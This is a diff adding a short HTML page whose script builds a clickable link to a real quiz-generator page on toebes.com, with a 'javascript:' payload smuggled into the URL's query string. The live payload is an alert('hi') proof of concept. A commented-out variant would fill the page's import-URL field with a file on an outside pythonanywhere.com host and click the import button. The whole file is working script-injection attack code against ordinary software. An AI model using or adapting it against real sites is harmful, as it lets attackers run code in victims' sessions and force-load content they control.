@@ -1,0 +1,16 @@
+<html>
+  <head></head>
+  <body>
+    <script>
+      let a = document.createElement('a');
+      let title = "click to open test in toebes";
+      let linkText = document.createTextNode(title);
+      a.appendChild(linkText);
+      a.title = title;
+      let code = "window.onload = () => { alert('hi') }";// "document.getElementById('xmlurl').value = 'https://bobbbbbbb.pythonanywhere.com/test.json?Epic&2'; document.getElementById('okimport').enabled = true; document.getElementById('okimport').click();";
+      let url = "https://toebes.com/codebusters/TestGenerator.html?javascript:(function(){"+code+"})();";
+      a.href = url;
+      document.body.appendChild(a);
+    </script>
+  </body>
+</html>
